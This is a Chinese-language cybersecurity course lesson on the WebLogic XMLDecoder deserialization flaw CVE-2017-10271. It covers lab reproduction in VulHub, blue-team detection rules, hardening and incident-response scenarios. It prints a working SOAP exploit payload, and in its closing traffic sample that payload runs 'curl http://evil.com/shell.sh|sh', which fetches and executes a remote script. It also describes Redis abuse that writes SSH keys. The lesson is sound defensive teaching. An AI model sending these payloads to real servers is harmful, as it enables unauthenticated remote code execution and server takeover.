---
title: "Day 43: Weblogic漏洞复现与检测（CVE-2017-10271）"
day: 43
difficulty: "中级"
category: "cyber-learning"
---

# Day 43: Weblogic漏洞复现与检测（CVE-2017-10271）

## 今日目标


1. 理解Weblogic反序列化漏洞（CVE-2017-10271）的原理
2. 学会在VulHub中复现该漏洞
3. 掌握Weblogic漏洞的蓝队检测方法

> **漏洞概述**：Weblogic是Oracle公司开发的企业级Java应用服务器，
> 广泛应用于政府、金融、电信等行业。CVE-2017-10271是其经典的反序列化漏洞，
> 攻击者无需认证即可通过XMLDecoder远程执行任意命令。

---

## 漏洞原理（通俗版）

Java有一种叫做"序列化"的技术，可以把对象转换成字节流保存或传输，
再通过"反序列化"把字节流转回对象。这就像把物品拆成零件寄出去，
收件人再按说明组装回来。

问题出在：如果攻击者在零件里混入了"炸弹零件"（恶意代码），
服务器在反序列化（组装）时就会"引爆"这些代码。

Weblogic的XMLDecoder组件在处理XML数据时，没有做好安全检查，
导致攻击者可以在XML中嵌入恶意的Java代码，服务器在解析XML时执行了这些代码。

**类比**：你收到一个包裹（XML请求），拆开时里面有个纸条写着"去银行转100万到某个账户"，
正常你应该检查纸条是谁写的，但Weblogic没检查就直接去转账了。

---

## 漏洞复现

### 第一步：启动环境
```
cd vulhub/weblogic/CVE-2017-10271
docker-compose up -d
```
等待约1-2分钟，访问 http://localhost:7001 看到Weblogic控制台即可。

### 第二步：构造攻击Payload

攻击XML的核心结构：
```xml
<soapenv:Envelope>
  <soapenv:Header>
    <work:WorkContext>
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>COMMAND_HERE</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```

发送到Weblogic的 /wls-wsat/CoordinatorPortType 端点。

### 第三步：验证漏洞

发送一条执行 whoami 的Payload，观察响应。如果返回了执行结果，说明漏洞存在。
（注：有些环境可能需要反弹Shell才能看到回显）

### 第四步：清理环境
```
docker-compose down
```

---

## 蓝队检测特征

### 流量层检测
| 检测点 | 特征 | 可信度 |
|:---|:---|:---|
| 目标URL | /wls-wsat/ 路径（组件部署路径） | 高 |
| Content-Type | text/xml | 高 |
| 请求体关键字 | ProcessBuilder、Runtime.getRuntime | 极高 |
| 请求体标签 | <work:WorkContext> | 极高 |
| POST请求体大小 | 通常1-5KB（比正常XML大） | 中 |

### 经典检测规则思路

```
IF: 
  Request URL contains "/wls-wsat/"
  AND Content-Type == "text/xml"
  AND Request Body contains "ProcessBuilder" 
     OR "Runtime"
     OR "WorkContext"
THEN:
  ALERT: WebLogic反序列化攻击
  ACTION: 阻断IP+通知安全团队
```

### 日志层检测
在Weblogic的access日志中：POST /wls-wsat/CoordinatorPortType 且响应状态码200。
正常业务极少访问 /wls-wsat/ 路径，出现这个路径基本可以确认是扫描或攻击。

---

## 修复与加固
1. 升级Weblogic版本（Oracle已发布补丁）
2. 删除不需要的组件（wls-wsat等）
3. 在WAF/反向代理层拦截 /wls-wsat/ 路径的访问
4. 限制Weblogic管理端口只对内网开放

---

## Weblogic漏洞家族速查

| CVE | 类型 | 利用方式 | 端口 |
|:---|:---|:---|:---|
| CVE-2017-10271 | XMLDecoder反序列化 | /wls-wsat/ POST XML | 7001 |
| CVE-2018-2628 | T3协议反序列化 | T3协议直接发送 | 7001 |
| CVE-2019-2725 | wls9_async反序列化 | /_async/ SOAP | 7001 |
| CVE-2020-14882 | 后台未授权访问 | /console/ 路径穿越 | 7001 |
| CVE-2023-21839 | T3/IIOP反序列化 | T3协议 | 7001 |

---

## 动手任务
1. 启动CVE-2017-10271漏洞环境
2. 用BurpSuite抓取攻击请求（或使用公开PoC脚本）
3. 在Wireshark中观察完整的攻击流量
4. 总结Weblogic反序列化漏洞的通用检测模式
5. 尝试寻找更多Weblogic漏洞的公开信息


---

## 实战思维训练：从理论到肌肉记忆

### 为什么要做实战思维训练？

理论学完了，不等于实战中用得上。蓝队工作中最常见的问题是：
"我知道SQL注入是什么，但真看到日志时反应不过来。"

原因：知识和行动之间缺少"条件反射"训练。就像学开车——
知道刹车在哪儿和紧急情况能踩刹车是两回事。

### 蓝队条件反射训练法

**方法一：5秒判断法**

给自己看一条日志，5秒内回答三个问题：
1. 这是攻击吗？（是/否/不确定）
2. 如果是攻击，是什么类型？
3. 我应该做什么？（忽略/记录/告警/升级）

每天练10条，坚持一周，判断速度会明显提升。

**方法二：攻击路径推演法**

看到一条可疑日志后，在心里推演攻击者的下一步：
- SQL注入检测到 -> 攻击者下一步会尝试 UNION SELECT 查数据
- Webshell上传成功 -> 下一步会访问shell执行命令
- 端口扫描发现 -> 下一步会针对开放的服务做漏洞利用

提前想到攻击者的下一步，你就能先发制人。

**方法三：误报记忆库法**

每当你发现一个误报，记录下来：
- 误报的类型（SQL注入/XSS/目录遍历等）
- 触发误报的正常业务场景
- 你如何判断它是误报的

积累100个误报案例后，你的判断准确率会翻倍。

---

## 知识串联网络

网络安全知识不是一个个孤岛，它们之间有千丝万缕的联系。理清这些联系，你才能真正"融会贯通"。

| 层级 | 内容 | 今天涉及的 |
|:---|:---|:---|
| 第一层：认知 | ATT&CK、Kill Chain、漏洞原理 | 理论基础 |
| 第二层：工具 | Nmap、Burp、SQLMap、ELK | 工具支撑 |
| 第三层：检测 | 日志分析、告警研判、规则编写 | 核心技能 |
| 第四层：响应 | 应急响应、处置流程、报告撰写 | 最终目标 |

---

## 蓝队面试高频自测

**1. 请描述一次完整的Web攻击检测流程**
参考答案：收到告警 -> 查看日志确认 -> 分析Payload -> 判断类型 -> 确认是否成功 -> 处置 -> 写报告。

**2. 什么是IDS/IPS？区别是什么？**
IDS（入侵检测系统）只检测不阻断，IPS（入侵防御系统）检测+阻断。IDS像摄像头（记录），IPS像门禁（拦截）。

**3. ATT&CK框架对蓝队有什么用？**
ATT&CK告诉我们攻击者"会做什么"和"怎么做的"，蓝队据此在对应的战术阶段设置检测点。

**4. 告警很多怎么处理？**
先分级（高危立即处理、中危今日内、低危周汇总），再优化规则减少误报。

---

## 学习节奏建议

### 你现在的进度

你已经快完成一半的课程。很多人学网络安全坚持不了50天，你已经超过了他们。

### 常见瓶颈与突破

**瓶颈一：学了后面的忘了前面的**
每天花5分钟快速浏览前一天的笔记，每周花20分钟回顾本周知识点。

**瓶颈二：实操跟不上理论**
把环境搭建当作第一优先级的事，环境不通后续都白搭。Docker可以极大简化这个过程。

**瓶颈三：内容太多记不住**
优先记住"检测特征"和"处置流程"，具体命令可以查文档。

### 鼓励的话

你已经比80%的"想学网络安全但坚持不了"的人走得更远了。
再坚持70天，你就是那20%的人。


---


## WebLogic蓝队检测实战心得

### 为什么Weblogic漏洞在护网中是高频目标？

1. 企业广泛使用（政府、金融、大型企业最爱Oracle全家桶）
2. 端口7001/7002经常对外开放（业务需要+运维疏忽）
3. 版本升级慢（企业级应用不敢随便升级，怕影响业务）
4. 漏洞可直达命令执行（攻击效率高）

### 蓝队排查Weblogic的标准套路

```
Step 1: nmap扫描是否开放7001/7002端口
Step 2: 访问 http://ip:7001/console 确认是Weblogic
Step 3: 检查版本信息（登录页面通常有版本号）
Step 4: 对照CVE列表判断是否存在已知漏洞
Step 5: 在WAF上封堵 /wls-wsat/、/_async/ 等敏感路径
Step 6: 推动运维升级或加固
```

### 面试常见问题

**Q: Weblogic和Tomcat有什么区别？**
A: Weblogic是商业的企业级Java EE应用服务器（Oracle），支持完整的Java EE规范。
Tomcat是开源的轻量级Servlet容器（Apache），只支持部分规范。
从安全角度：Weblogic比Tomcat功能更多，端口更多，攻击面也更大。

**Q: 反序列化漏洞为什么这么难防？**
A: 因为序列化/反序列化是Java框架的基础机制，很难完全禁用。
修复通常需要：升级框架版本 + 使用黑名单/白名单限制反序列化的类 + 在WAF层检测恶意Payload。


---

> **明日预告**：明天继续你的网络安全之旅，坚持就是胜利。

---

## Weblogic反序列化漏洞深度解析

### 为什么反序列化漏洞那么难搞？

Java反序列化漏洞之所以成为"漏洞常青树"，有几个原因：

1. **序列化机制是Java的基础功能**：无法完全禁用，就像不能因为有人用刀伤人就把所有刀都禁了
2. **利用链（Gadget Chain）多样性**：攻击者可以组合不同的类来构造利用链，修了一个，还有另一个
3. **修复不彻底**：官方补丁常常是加黑名单，攻击者可以找到不在黑名单中的类继续利用
4. **影响面广**：只要用了Java序列化的应用都可能受影响（Weblogic、JBoss、Jenkins、WebSphere...）

### CVE-2017-10271的技术细节

这个漏洞的利用路径是：
1. 攻击者向 /wls-wsat/CoordinatorPortType 发送SOAP请求
2. SOAP请求中包含XML格式的payload
3. XML中使用 <java> 标签触发XMLDecoder
4. XMLDecoder在解析XML时调用 ProcessBuilder.start() 执行任意命令

关键点：**XMLDecoder这个类本身不应该接受外部输入！**
它是为处理可信的XML数据设计的，但Weblogic错误地将它暴露给了外部请求。

### Weblogic的安全架构与攻击面

Weblogic部署后的默认端口和安全组件：
- 7001：管理端口（AdminServer）
- 7002：受管服务器端口
- /console：管理控制台
- /wls-wsat/：Web Services Atomic Transaction（漏洞高发区）
- /_async/：异步服务（CVE-2019-2725的入口）
- /bea_wls_internal/：内部组件

蓝队排查应关注：哪些路径对外网开放了？每个开放的路径是否都是业务必需的？

### 实战：用BurpSuite检测Weblogic漏洞

1. 设置BurpSuite代理，浏览器访问Weblogic
2. 在HTTP History中观察请求，找到Weblogic特有的响应头
3. 尝试访问 /console、/wls-wsat/、/_async/ 等路径
4. 观察响应，判断是否存在这些组件

### Weblogic反序列化漏洞的发展历程

| 年份 | CVE | 漏洞类型 | 意义 |
|:---|:---|:---|:---|
| 2015 | CVE-2015-4852 | T3反序列化 | Weblogic反序列化元年 |
| 2017 | CVE-2017-10271 | XMLDecoder反序列化 | 无需认证，危害极大 |
| 2018 | CVE-2018-2628 | T3反序列化绕过 | 证明黑名单修复不靠谱 |
| 2019 | CVE-2019-2725 | wls9_async反序列化 | 新一轮利用 |
| 2020 | CVE-2020-14882 | 控制台未授权 | 直接拿管理权限 |
| 2023 | CVE-2023-21839 | T3/IIOP反序列化 | 至今仍在被利用 |

Weblogic反序列化漏洞的历史证明了一个道理：**只要资产还在跑老版本的Weblogic，就要持续关注新的CVE。**

---

## 蓝队实战：写一份Weblogic安全评估

假设你被要求评估公司Weblogic服务器的安全性，写一份简评：

1. 确认版本号（登录控制台或查看响应头）
2. 对照CVE列表，列出所有适用漏洞
3. 对高危漏洞进行手工验证
4. 给出修复优先级（能立即修的 vs 需要停机的 vs 需要升级的）
5. 对于暂时无法修复的，给出WAF层面的缓解措施

---

## 今日检查清单
- [ ] 理解了反序列化漏洞的核心原理
- [ ] 成功启动了CVE-2017-10271环境
- [ ] 了解了Weblogic的默认端口和敏感路径
- [ ] 知道至少3种Weblogic漏洞的检测方法
- [ ] 能在日志中识别Weblogic攻击流量

> 明日预告：Day 44 — Redis未授权访问。这是另一种完全不同类型的漏洞——不是代码缺陷，而是配置问题。
## 蓝队日常演练：模拟真实护网场景

### 场景一：凌晨3点收到Redis告警

**场景描述：**
你值夜班，凌晨3点监控平台弹出告警：一台服务器（10.0.1.50）的Redis端口（6379）
收到了来自境外IP（45.x.x.x）的连接请求，并且成功执行了 CONFIG SET 命令。

**你的处置流程：**

1. **第一反应（0-30秒）**：P0告警，立即确认
   - 打开ELK，搜索源IP 45.x.x.x 的所有日志
   - 发现该IP在过去10分钟内一直在对内网做端口扫描

2. **分析阶段（30秒-2分钟）**：
   - 查看Redis日志：发现执行了 CONFIG SET dir /root/.ssh/ 和 CONFIG SET dbfilename authorized_keys
   - 判断：攻击者正在尝试写入SSH公钥，获取服务器控制权！

3. **处置阶段（2-5分钟）**：
   - 立即在防火墙上封禁 45.x.x.x
   - SSH登录 10.0.1.50，检查 /root/.ssh/authorized_keys 是否有异常公钥
   - 给Redis设置临时密码：CONFIG SET requirepass "emergency_pass_2026"
   - 通知组长和运维

4. **善后阶段（5-30分钟）**：
   - 排查同一网段其他Redis是否也有类似配置问题
   - 检查是否有后续的SSH登录记录（如果有，说明已被入侵）
   - 写应急处置报告

**这个场景的启示：**
- Redis未授权访问不是"小问题"，它可以导致服务器被完全控制
- 凌晨的攻击需要特别重视，因为攻击者知道这个时候防守最薄弱
- 处置要快：从发现到封禁最好在5分钟内完成

### 场景二：办公网发现Weblogic扫描流量

**场景描述：**
IDS检测到某内网IP（192.168.1.100）在扫描多个服务器的7001端口，
并发送了带有 ProcessBuilder 关键字的SOAP请求。

**判断思路：**
内网IP发起Weblogic攻击 -> 两台可能：
1. 安全团队在做渗透测试（查一下有没有授权的测试计划）
2. 这台机器已经被黑客控制，正在内网横向移动

查询后发现当天没有测试计划 -> 选项2成立！

**处置流程：**
1. 立即断网这台机器（但不关机，保留内存证据）
2. 检查该机器的进程列表、网络连接、计划任务
3. 发现了一个可疑的进程：java -jar reverser_shell.jar
4. 追踪攻击入口：该机器上运行着一个未修复的Shiro应用

**教训：**
- 内网的异常扫描比外网扫描危险100倍，因为说明边界已被突破
- 不看来源IP的"态度"（内网=信任）是安全的大忌
- 一旦确认内网机器被控，必须立即隔离

---

## 蓝队必备工具链复盘

你现在已经接触了以下工具，来做个阶段性复盘：

| 工具 | 已学会 | 还需要学什么 | 优先级 |
|:---|:---|:---|:---|
| Nmap | 基础端口扫描 | -sV服务版本、-sC脚本扫描 | 高 |
| Wireshark | 基础抓包 | 过滤器、Follow Stream | 高 |
| BurpSuite | 代理+Repeater | Intruder、Decoder | 高 |
| SQLMap | 识别SQLMap流量 | 更高级的流量特征 | 中 |
| OpenVAS | 基础漏洞扫描 | 报告解读、任务计划 | 中 |
| ELK | 基础查询 | KQL高级语法、可视化 | 高 |
| VulHub | 漏洞环境启动 | 更多漏洞的复现 | 高 |
| Hydra | 基础弱口令检测 | 多协议、并发优化 | 低 |

---

## 网络安全学习心态篇

### 为什么有人能坚持120天，有人3天就放弃？

**第一种心态："我要学会所有东西"**
每天看教程、记笔记，追求"全面掌握"。
问题是：网络安全领域太大，根本不可能"全学会"。
几天后发现自己只学了冰山一角 -> 挫败感 -> 放弃。

**第二种心态："我今天比昨天强一点就行"**
不求全面，只求进步。今天搞懂了一个漏洞，就是胜利。
这种心态下，120天后你回头看，吓一跳——原来已经学了这么多。

**你是哪种？如果是第一种，现在是切换心态的最佳时机。**

### 坚持的秘诀

1. **不要完美主义**：今天状态不好？学15分钟也可以，不要"既然不能学1小时就不学了"
2. **建立仪式感**：每天固定时间学习（比如早上通勤时看30分钟）
3. **及时反馈**：每学完一个漏洞就奖励自己（一杯咖啡、一集电视剧）
4. **同伴激励**：找个同学一起学，互相打卡
5. **记录进步**：每周回头看看自己写的笔记，你会发现自己进步了

### 写给你自己

你现在学网络安全可能是因为：
- 想找一份安全相关的工作
- 想参加护网行动
- 单纯对黑客技术感兴趣
- 被要求学（公司安排）

不管什么原因，记住你的初始目标。当想放弃时，想想当初为什么开始。

> 一句话总结：网络安全没有"学完"的那一天，但每学一天，你就比昨天更强一点。这120天就是你的"第一桶知识"。

---

## Weblogic攻击流量样本

### 真实攻击流量的Wireshark特征

攻击者发送到 /wls-wsat/CoordinatorPortType 的典型请求：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: target:7001
Content-Type: text/xml; charset=utf-8
Content-Length: 1234

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/sh</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>curl http://evil.com/shell.sh|sh</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```

Wireshark过滤条件：
```
http.request.method == "POST" and http.request.uri contains "/wls-wsat/"
```

---

> **明日预告**：继续前进，每一天都是进步。
